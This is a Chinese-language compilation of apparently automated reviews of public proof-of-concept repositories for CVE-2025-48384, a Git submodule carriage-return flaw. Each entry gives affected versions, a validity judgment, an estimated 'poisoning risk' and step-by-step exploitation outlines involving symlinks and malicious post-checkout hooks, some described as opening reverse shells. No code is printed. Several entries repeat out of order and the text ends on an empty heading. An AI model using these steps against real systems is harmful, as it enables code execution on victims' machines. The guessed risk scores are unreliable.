## POC #34

**来源**: [CVE-2025-48384-won6c_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-won6c_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库）和存在易受攻击的 Git 版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 存在于 Git 中，源于其对配置中回车符处理不当。攻击者可以通过在 submodule 路径中注入回车符，导致 submodule 被检出到错误的位置。如果存在一个符号链接将该错误路径指向 submodule 钩子目录，且 submodule 包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本，造成任意代码执行。

**有效性：**
根据 arcticwolf.com 的搜索结果表明，此漏洞存在可用的 PoC。 提供的 PoC 代码 `/tmp/b95b758d8faf22baf81ee61a8796e533/README.md` 只是一个 dummy submodule 的 README 文件，本身不具备利用漏洞的能力。 完整的 PoC 应当包含恶意的 submodule 配置和 hook 文件。

**投毒风险：**
提供的 PoC 代码不包含任何恶意代码，因此投毒风险为 0%。 但是，实际利用中，攻击者会构建包含恶意 hook 脚本的 submodule，从而在用户克隆并初始化 submodule 时执行恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意 submodule 的 Git 仓库。
2.  在 submodule 的路径中注入回车符。
3.  创建一个符号链接，将包含回车符的错误路径指向 submodule 的钩子目录 (.git/hooks)。
4.  在 submodule 中添加一个恶意的 post-checkout 钩子脚本。
5.  诱导用户克隆该仓库并初始化 submodule (git submodule update --init --recursive)。
6.  当用户检出 submodule 时，由于路径包含回车符，submodule 会被检出到错误的位置，触发符号链接，执行钩子目录下的恶意脚本，从而实现任意代码执行。

**项目地址:** [won6c/CVE-2025-48384-submodule](https://github.com/won6c/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #35

**来源**: [CVE-2025-48384-wzx5002_totallynotsuspicious.md](../2025/CVE-2025-48384-wzx5002_totallynotsuspicious.md)

## CVE-2025-48384-Git-RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理包含回车符的配置值时，读取和写入方式不一致。攻击者可以利用这个漏洞，通过构造包含恶意配置（例如，带有尾随回车符的子模块路径）的Git仓库，诱导受害者克隆该仓库，从而实现远程代码执行。具体利用方式是：

1.  **恶意仓库创建：** 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件中的子模块路径包含一个尾随的回车符(`\r`)。
2.  **符号链接利用：** 当受害者使用`git submodule init`初始化子模块时，Git会错误地解析子模块路径。攻击者在仓库中创建一个符号链接，将错误的子模块路径指向`.git/hooks`目录。
3.  **恶意钩子：**  攻击者在子模块中包含一个恶意的`post-checkout`钩子脚本。该脚本会在`git checkout`操作后自动执行。
4.  **诱导受害者：** 攻击者诱导受害者克隆恶意仓库并初始化子模块（例如，通过`git clone --recursive`或手动执行`git submodule init`和`git submodule update`）。
5.  **代码执行：** 当受害者检出（checkout）仓库时，`post-checkout`钩子脚本会被执行，从而导致远程代码执行。

提供的PoC代码是一个反弹shell的`post-checkout`钩子脚本，如果成功执行，将允许攻击者控制受害者的系统。由于提供的poc代码功能单一,仅仅是反弹shell,没有进行额外的恶意代码操作,判定投毒风险为0%。根据搜索引擎结果，该漏洞已经被CISA添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。


**项目地址:** [wzx5002/totallynotsuspicious](https://github.com/wzx5002/totallynotsuspicious)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---



---

## POC #30

**来源**: [CVE-2025-48384-testdjshan_CVE-2025-48384.md](../2025/CVE-2025-48384-testdjshan_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。漏洞利用主要围绕 Git 如何处理带有回车符的配置值。如果 submodule 路径包含尾随的回车符 (CR)，则修改后的路径会被读取，导致 submodule 被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向 submodule hooks 目录，并且 submodule 包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致任意代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞是有效的。已发布了针对此漏洞的修复程序。

**投毒风险：**

提供的 POC 代码包含以下文件：

*   `README.md`: 一个空的 README 文件
*   `sub`:  一个 `.git/modules/sub/hooks` 目录。

`sub` 目录本身并不包含任何可执行代码，仅仅是一个空的hooks目录，因此直接投毒的可能性较低。但是,攻击者可能在受害者执行 `git clone --recursive`后，通过 submodule 初始化过程创建恶意的 hooks 文件或者修改 `.gitmodules` 文件来间接投毒。因此，存在一定的投毒风险，但风险等级较低。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库。该文件中的 submodule 路径包含一个尾随的回车符 (CR)。
2.  **设置符号链接：**  在仓库中创建一个符号链接，该链接将包含回车符的路径指向 submodule 的 `hooks` 目录。
3.  **添加恶意 hook：**  在 submodule 的 `hooks` 目录中添加一个恶意的 post-checkout hook 脚本。当用户执行 `git clone --recursive` 命令时，Git 会将 submodule 检出到错误的位置，由于存在符号链接，恶意的 post-checkout hook 将会被执行，从而导致任意代码执行。

**风险分析：**

该漏洞的利用需要用户执行 `git clone --recursive` 命令，并且依赖于用户机器上的 Git 版本存在漏洞。攻击的复杂性较高，需要精心的构造恶意仓库，但是如果成功利用，可以导致远程代码执行，因此风险等级较高。

**搜索引擎结果分析：**

*   NVD 提供了漏洞的详细信息和更新记录。
*   Red Hat 将此漏洞标记为“重要”，强调了其对 Git 路径和配置完整性的威胁。
*   dgl.cx 的文章详细介绍了利用此漏洞进行 RCE 的方法。


**项目地址:** [testdjshan/CVE-2025-48384](https://github.com/testdjshan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #31

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化恶意子模块)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置中注入包含回车符的恶意数据来执行任意代码。该漏洞的核心在于 Git 处理配置文件中带有尾随回车符的值时存在缺陷。具体来说，当 Git 写入包含尾随回车符的配置条目时，它不会对该值进行引用，导致回车符在后续读取时丢失。这会影响子模块的初始化过程，如果子模块路径包含尾随回车符，则会导致子模块被检出到错误的位置。攻击者可以利用这一点，通过创建一个指向子模块 hooks 目录的符号链接，并在子模块中包含一个可执行的 post-checkout hook。当用户克隆包含恶意配置的仓库或初始化恶意子模块时，`post-checkout` 钩子会被执行，从而导致任意代码执行。

提供的POC利用代码通过`post-checkout` hook 替换系统中的nginx程序，连接攻击者的服务器，反弹shell。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符。
2.  攻击者在仓库中创建一个符号链接，将带有回车符的子模块路径指向 `.git/modules/<submodule>/hooks` 目录。
3.  攻击者在子模块的 hooks 目录中创建一个 `post-checkout` 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将恶意仓库托管在公共平台上或通过其他方式分发给目标用户。
5.  当目标用户克隆恶意仓库或初始化恶意子模块时，Git 会尝试将子模块检出到错误的位置，由于存在符号链接，实际上会将子模块检出到 `.git/modules/<submodule>/hooks` 目录。
6.  在子模块检出后，`post-checkout` 钩子脚本会被执行，从而导致攻击者指定的任意代码在目标系统上运行。

**有效性：**

该POC代码是有效的，可以用于利用 CVE-2025-48384 漏洞执行任意代码。

**投毒风险：**

该POC代码的功能明确，旨在利用该漏洞。从代码逻辑来看，并没有发现隐藏的恶意功能或者后门，可以判定没有投毒风险。

**搜索引擎结果分析：**

搜索结果表明该漏洞是Git配置注入/符号链接攻击漏洞，并且得到了安全社区的广泛关注，各大厂商都发布了安全更新。

**项目地址:** [vinieger/CVE-2025-48384-bad-nginx-submodule](https://github.com/vinieger/CVE-2025-48384-bad-nginx-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #32

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md)

## CVE-2025-48384-Git Config Quoting Vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化包含恶意配置的子模块)

**POC 可用性:** 部分

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置引用时存在缺陷，允许攻击者通过精心构造的 Git 仓库或子模块执行任意代码。漏洞的利用方式是：攻击者创建一个恶意仓库，该仓库包含一个带有尾随回车符的子模块路径，并在子模块的 hooks 目录中放置恶意 post-checkout hook。当用户克隆该仓库或初始化包含恶意配置的子模块时，由于 Git 会错误地解析带有尾随回车符的子模块路径，导致子模块被检出到错误的位置。如果该错误位置恰好是一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，从而导致代码执行。 

提供的 POC 代码 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md` 看起来只是一个 README 文件，表明该仓库很可能是漏洞的利用示例或者演示。根据文件名`CVE-2025-48384-bad-nginx`推测,该代码仓库可能包含一个用于利用此漏洞的恶意Nginx配置。

**有效性：** 漏洞本身是有效的，因为多个来源都证实了它的存在。然而，仅凭提供的 POC 代码片段 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md`无法判断具体的漏洞利用方式和有效性。需要查看完整的仓库内容才能确定其利用方式是否有效。

**投毒风险：** 仅根据提供的 README 文件，无法确定是否存在投毒代码。恶意代码可能隐藏在其他文件中（例如子模块的 hook 脚本或Nginx配置）。根据经验，安全研究人员倾向于展示漏洞利用过程,因此，仓库作者主动投毒的可能性较低，估计投毒风险为 10%。该仓库可能需要配合其他步骤,例如修改Nginx配置或者安装特定的依赖,来达到利用效果，这些步骤中可能包含潜在的风险。

**利用方式：** 攻击者诱导用户克隆包含恶意配置的仓库（带有尾随回车符的子模块路径以及恶意的post-checkout hook),从而触发代码执行。

由于搜索引擎返回了大量的相关信息，表明此漏洞是真实且被广泛关注的。SUSE和RedHat都发布了安全公告，更证明了该漏洞的存在。


**项目地址:** [vinieger/CVE-2025-48384-bad-nginx](https://github.com/vinieger/CVE-2025-48384-bad-nginx)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #33

**来源**: [CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md](../2025/CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并递归初始化子模块，并需要用户交互

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个漏洞，由于Git在处理配置文件时，会删除尾部的CRLF字符，导致如果子模块路径中包含尾部CR字符，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本，从而导致任意代码执行。 

**有效性：**

根据提供的漏洞库信息和搜索引擎结果，以及POC代码，可以判断此POC有效。POC Dockerfile使用`apk`安装了受影响的Git版本（2.40.4），然后克隆了两个包含利用代码的Git仓库。Dockerfile中的CMD指令执行了`git clone --recurse-submodules`命令，这会触发漏洞利用。搜索引擎结果中也提到了此漏洞存在POC，并提供了利用示例，表明此漏洞可以被复现。

**投毒风险：**

分析Dockerfile的内容，主要的风险点集中在克隆的两个Git仓库：`https://github.com/vinieger/CVE-2025-48384.git`和`https://github.com/liamg/CVE-2025-48384-submodule.git`。

*   检查`vinieger/CVE-2025-48384`仓库，该仓库主要用于提供触发漏洞的配置，风险较低，因为目标是演示漏洞本身。
*   `liamg/CVE-2025-48384-submodule` 仓库，它用于提供恶意的子模块。恶意代码最可能存在于子模块的hooks目录中，尤其是post-checkout hook。该仓库需要仔细审查。考虑到其目的是为了利用漏洞，因此其存在恶意代码的可能性较高，但主要用于演示漏洞利用而非进行大规模攻击。因此，投毒风险相对较低，估计在10%左右，主要源于该仓库可能隐藏一些超出漏洞演示范围的恶意行为（例如，收集用户信息或尝试横向渗透）。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该配置包括带有尾部CR字符的子模块路径。
2.  攻击者创建一个包含恶意post-checkout hook的子模块，并将该子模块托管在另一个Git仓库。
3.  攻击者创建一个符号链接，将带有尾部CR字符的子模块路径指向子模块的hooks目录。
4.  受害者克隆包含恶意配置的Git仓库，并使用`git clone --recurse-submodules`命令初始化子模块。
5.  Git在处理子模块路径时，会错误地将子模块检出到符号链接指向的目录，从而执行恶意post-checkout hook，导致任意代码执行。

**项目地址:** [vinieger/vinieger-CVE-2025-48384-Dockerfile](https://github.com/vinieger/vinieger-CVE-2025-48384-Dockerfile)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #34

**来源**: [CVE-2025-48384-won6c_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-won6c_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库）和存在易受攻击的 Git 版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 存在于 Git 中，源于其对配置中回车符处理不当。攻击者可以通过在 submodule 路径中注入回车符，导致 submodule 被检出到错误的位置。如果存在一个符号链接将该错误路径指向 submodule 钩子目录，且 submodule 包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本，造成任意代码执行。

**有效性：**
根据 arcticwolf.com 的搜索结果表明，此漏洞存在可用的 PoC。 提供的 PoC 代码 `/tmp/b95b758d8faf22baf81ee61a8796e533/README.md` 只是一个 dummy submodule 的 README 文件，本身不具备利用漏洞的能力。 完整的 PoC 应当包含恶意的 submodule 配置和 hook 文件。

**投毒风险：**
提供的 PoC 代码不包含任何恶意代码，因此投毒风险为 0%。 但是，实际利用中，攻击者会构建包含恶意 hook 脚本的 submodule，从而在用户克隆并初始化 submodule 时执行恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意 submodule 的 Git 仓库。
2.  在 submodule 的路径中注入回车符。
3.  创建一个符号链接，将包含回车符的错误路径指向 submodule 的钩子目录 (.git/hooks)。
4.  在 submodule 中添加一个恶意的 post-checkout 钩子脚本。
5.  诱导用户克隆该仓库并初始化 submodule (git submodule update --init --recursive)。
6.  当用户检出 submodule 时，由于路径包含回车符，submodule 会被检出到错误的位置，触发符号链接，执行钩子目录下的恶意脚本，从而实现任意代码执行。

**项目地址:** [won6c/CVE-2025-48384-submodule](https://github.com/won6c/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #35

**来源**: [CVE-2025-48384-wzx5002_totallynotsuspicious.md](../2025/CVE-2025-48384-wzx5002_totallynotsuspicious.md)

## CVE-2025-48384-Git-RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理包含回车符的配置值时，读取和写入方式不一致。攻击者可以利用这个漏洞，通过构造包含恶意配置（例如，带有尾随回车符的子模块路径）的Git仓库，诱导受害者克隆该仓库，从而实现远程代码执行。具体利用方式是：

1.  **恶意仓库创建：** 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件中的子模块路径包含一个尾随的回车符(`\r`)。
2.  **符号链接利用：** 当受害者使用`git submodule init`初始化子模块时，Git会错误地解析子模块路径。攻击者在仓库中创建一个符号链接，将错误的子模块路径指向`.git/hooks`目录。
3.  **恶意钩子：**  攻击者在子模块中包含一个恶意的`post-checkout`钩子脚本。该脚本会在`git checkout`操作后自动执行。
4.  **诱导受害者：** 攻击者诱导受害者克隆恶意仓库并初始化子模块（例如，通过`git clone --recursive`或手动执行`git submodule init`和`git submodule update`）。
5.  **代码执行：** 当受害者检出（checkout）仓库时，`post-checkout`钩子脚本会被执行，从而导致远程代码执行。

提供的PoC代码是一个反弹shell的`post-checkout`钩子脚本，如果成功执行，将允许攻击者控制受害者的系统。由于提供的poc代码功能单一,仅仅是反弹shell,没有进行额外的恶意代码操作,判定投毒风险为0%。根据搜索引擎结果，该漏洞已经被CISA添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。


**项目地址:** [wzx5002/totallynotsuspicious](https://github.com/wzx5002/totallynotsuspicious)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---



---

## POC #30

**来源**: [CVE-2025-48384-testdjshan_CVE-2025-48384.md](../2025/CVE-2025-48384-testdjshan_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。漏洞利用主要围绕 Git 如何处理带有回车符的配置值。如果 submodule 路径包含尾随的回车符 (CR)，则修改后的路径会被读取，导致 submodule 被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向 submodule hooks 目录，并且 submodule 包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致任意代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞是有效的。已发布了针对此漏洞的修复程序。

**投毒风险：**

提供的 POC 代码包含以下文件：

*   `README.md`: 一个空的 README 文件
*   `sub`:  一个 `.git/modules/sub/hooks` 目录。

`sub` 目录本身并不包含任何可执行代码，仅仅是一个空的hooks目录，因此直接投毒的可能性较低。但是,攻击者可能在受害者执行 `git clone --recursive`后，通过 submodule 初始化过程创建恶意的 hooks 文件或者修改 `.gitmodules` 文件来间接投毒。因此，存在一定的投毒风险，但风险等级较低。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库。该文件中的 submodule 路径包含一个尾随的回车符 (CR)。
2.  **设置符号链接：**  在仓库中创建一个符号链接，该链接将包含回车符的路径指向 submodule 的 `hooks` 目录。
3.  **添加恶意 hook：**  在 submodule 的 `hooks` 目录中添加一个恶意的 post-checkout hook 脚本。当用户执行 `git clone --recursive` 命令时，Git 会将 submodule 检出到错误的位置，由于存在符号链接，恶意的 post-checkout hook 将会被执行，从而导致任意代码执行。

**风险分析：**

该漏洞的利用需要用户执行 `git clone --recursive` 命令，并且依赖于用户机器上的 Git 版本存在漏洞。攻击的复杂性较高，需要精心的构造恶意仓库，但是如果成功利用，可以导致远程代码执行，因此风险等级较高。

**搜索引擎结果分析：**

*   NVD 提供了漏洞的详细信息和更新记录。
*   Red Hat 将此漏洞标记为“重要”，强调了其对 Git 路径和配置完整性的威胁。
*   dgl.cx 的文章详细介绍了利用此漏洞进行 RCE 的方法。


**项目地址:** [testdjshan/CVE-2025-48384](https://github.com/testdjshan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #31

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化恶意子模块)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置中注入包含回车符的恶意数据来执行任意代码。该漏洞的核心在于 Git 处理配置文件中带有尾随回车符的值时存在缺陷。具体来说，当 Git 写入包含尾随回车符的配置条目时，它不会对该值进行引用，导致回车符在后续读取时丢失。这会影响子模块的初始化过程，如果子模块路径包含尾随回车符，则会导致子模块被检出到错误的位置。攻击者可以利用这一点，通过创建一个指向子模块 hooks 目录的符号链接，并在子模块中包含一个可执行的 post-checkout hook。当用户克隆包含恶意配置的仓库或初始化恶意子模块时，`post-checkout` 钩子会被执行，从而导致任意代码执行。

提供的POC利用代码通过`post-checkout` hook 替换系统中的nginx程序，连接攻击者的服务器，反弹shell。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符。
2.  攻击者在仓库中创建一个符号链接，将带有回车符的子模块路径指向 `.git/modules/<submodule>/hooks` 目录。
3.  攻击者在子模块的 hooks 目录中创建一个 `post-checkout` 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将恶意仓库托管在公共平台上或通过其他方式分发给目标用户。
5.  当目标用户克隆恶意仓库或初始化恶意子模块时，Git 会尝试将子模块检出到错误的位置，由于存在符号链接，实际上会将子模块检出到 `.git/modules/<submodule>/hooks` 目录。
6.  在子模块检出后，`post-checkout` 钩子脚本会被执行，从而导致攻击者指定的任意代码在目标系统上运行。

**有效性：**

该POC代码是有效的，可以用于利用 CVE-2025-48384 漏洞执行任意代码。

**投毒风险：**

该POC代码的功能明确，旨在利用该漏洞。从代码逻辑来看，并没有发现隐藏的恶意功能或者后门，可以判定没有投毒风险。

**搜索引擎结果分析：**

搜索结果表明该漏洞是Git配置注入/符号链接攻击漏洞，并且得到了安全社区的广泛关注，各大厂商都发布了安全更新。

**项目地址:** [vinieger/CVE-2025-48384-bad-nginx-submodule](https://github.com/vinieger/CVE-2025-48384-bad-nginx-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #32

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md)

## CVE-2025-48384-Git Config Quoting Vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化包含恶意配置的子模块)

**POC 可用性:** 部分

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置引用时存在缺陷，允许攻击者通过精心构造的 Git 仓库或子模块执行任意代码。漏洞的利用方式是：攻击者创建一个恶意仓库，该仓库包含一个带有尾随回车符的子模块路径，并在子模块的 hooks 目录中放置恶意 post-checkout hook。当用户克隆该仓库或初始化包含恶意配置的子模块时，由于 Git 会错误地解析带有尾随回车符的子模块路径，导致子模块被检出到错误的位置。如果该错误位置恰好是一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，从而导致代码执行。 

提供的 POC 代码 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md` 看起来只是一个 README 文件，表明该仓库很可能是漏洞的利用示例或者演示。根据文件名`CVE-2025-48384-bad-nginx`推测,该代码仓库可能包含一个用于利用此漏洞的恶意Nginx配置。

**有效性：** 漏洞本身是有效的，因为多个来源都证实了它的存在。然而，仅凭提供的 POC 代码片段 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md`无法判断具体的漏洞利用方式和有效性。需要查看完整的仓库内容才能确定其利用方式是否有效。

**投毒风险：** 仅根据提供的 README 文件，无法确定是否存在投毒代码。恶意代码可能隐藏在其他文件中（例如子模块的 hook 脚本或Nginx配置）。根据经验，安全研究人员倾向于展示漏洞利用过程,因此，仓库作者主动投毒的可能性较低，估计投毒风险为 10%。该仓库可能需要配合其他步骤,例如修改Nginx配置或者安装特定的依赖,来达到利用效果，这些步骤中可能包含潜在的风险。

**利用方式：** 攻击者诱导用户克隆包含恶意配置的仓库（带有尾随回车符的子模块路径以及恶意的post-checkout hook),从而触发代码执行。

由于搜索引擎返回了大量的相关信息，表明此漏洞是真实且被广泛关注的。SUSE和RedHat都发布了安全公告，更证明了该漏洞的存在。


**项目地址:** [vinieger/CVE-2025-48384-bad-nginx](https://github.com/vinieger/CVE-2025-48384-bad-nginx)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #33

